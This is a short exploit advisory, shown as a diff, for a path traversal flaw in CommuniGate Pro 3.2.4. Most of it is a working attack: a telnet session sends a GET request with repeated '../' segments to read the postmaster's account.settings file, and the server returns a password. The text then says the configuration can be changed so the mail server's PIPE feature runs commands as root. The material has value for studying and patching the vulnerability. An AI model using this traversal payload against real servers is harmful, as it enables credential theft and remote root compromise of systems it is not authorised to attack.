@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/1493/info
+
+A vulnerability exists in the CommuniGate Pro product, from Stalker. It is possible to exploit this vulnerability to read arbitrary files on the filesystem. As CommuniGate Pro runs as root, any file can be accessed. Using this flaw, it is possible to gain enough privilege to remotely execute commands as root. 
+
+Retrieve the postmaster/manager configuration file:
+homer:~$ telnet ilf 8010
+Escape character is '^]'.
+GET /Guide/../../../../../../../../../../../var/CommuniGate/Accounts/postmaster.macnt/account.settings HTTP/1.0
+
+HTTP/1.0 200 OK
+Content-Length: 61
+Date: Mon, 03 Apr 2000 09:17:35 GMT
+Content-Type: application/octet-stream
+Server: CommuniGatePro/3.2.4
+Expires: Tue, 04 Apr 2000 09:17:35 GMT
+
+{ ExternalINBOX = NO; Password = 8093; UseAppPassword = YES;}
+Connection closed by foreign host.
+homer:~$
+
+Using this information, it is possible to alter the configuration on the mail server to allow execution using its PIPE feature.
+
